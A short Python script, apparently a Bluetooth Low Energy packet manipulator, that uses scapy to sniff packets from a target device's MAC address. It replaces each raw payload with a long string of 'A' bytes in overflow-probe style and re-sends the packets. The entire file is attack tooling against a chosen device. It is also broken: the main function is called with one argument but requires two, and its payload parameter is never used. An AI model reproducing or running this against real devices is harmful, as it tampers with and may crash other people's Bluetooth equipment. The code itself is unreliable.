from scapy.all import *
import sys

def scan_and_modify_packets(target_mac , payload):
    print(f"Scanning packets for device: {target_mac}")
    def packet_callback(packet):
        if packet.haslayer(BTLE):
            if packet[BTLE].addr == target_mac:
                print(f"Original Packet: {packet.summary()}")
                if packet.haslayer(Raw):
                    packet[Raw].load = b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                print(f"Modified Packet: {packet.summary()}")
                sendp(packet, verbose=False)
    sniff(iface="hci0", prn=packet_callback, count=10)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python bt_packet_manipulator.py <MAC_ADDRESS>")
        sys.exit(1)
    target_mac = sys.argv[1]
    scan_and_modify_packets(target_mac)
